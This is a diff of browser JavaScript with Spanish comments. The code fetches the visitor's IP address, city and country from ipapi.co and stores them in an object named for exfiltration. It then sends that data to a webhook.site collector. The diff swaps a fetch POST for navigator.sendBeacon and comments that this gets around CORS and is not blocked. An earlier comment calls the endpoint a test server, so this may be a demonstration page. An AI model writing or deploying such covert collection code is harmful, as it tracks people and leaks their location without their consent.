@@ -162,23 +162,19 @@
             };
 
             try {
-                let response = await fetch('https://ipapi.co/json/');
-                let data = await response.json();
-                ipInfo = `${data.ip} (${data.city}, ${data.country_name})`;
-                datosExfiltracion.ip = data.ip;
-                datosExfiltracion.ubicacion = `${data.city}, ${data.country_name}`;
+            let response = await fetch('https://ipapi.co/json/');
+            let data = await response.json();
+            ipInfo = `${data.ip} (${data.city}, ${data.country_name})`;
+            datosExfiltracion.ip = data.ip;
+            datosExfiltracion.ubicacion = `${data.city}, ${data.country_name}`;
 
-                // OPCIONAL: Si deseas que los datos lleguen a tu servidor de pruebas, 
-                // reemplaza la URL de abajo por tu enlace de Webhook.site
-                await fetch('https://webhook.site/7a591fcc-9fba-4031-b06c-53203a9fc2f0', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(datosExfiltracion)
-                });              
+            // MÉTODO A PRUEBA DE CORS: sendBeacon envía los datos de inmediato sin bloquearse
+            let urlWebhook = 'https://webhook.site/7a591fcc-9fba-4031-b06c-53203a9fc2f0';
+            navigator.sendBeacon(urlWebhook, JSON.stringify(datosExfiltracion));
 
-            } catch (e) {
-                ipInfo = "Oculta / Restringida por red";
-            }
+        } catch (e) {
+            ipInfo = "Oculta / Restringida por red";
+        }
 
             // 3. Mostrar el reporte final en pantalla tras un pequeño retraso visual
             setTimeout(() => {
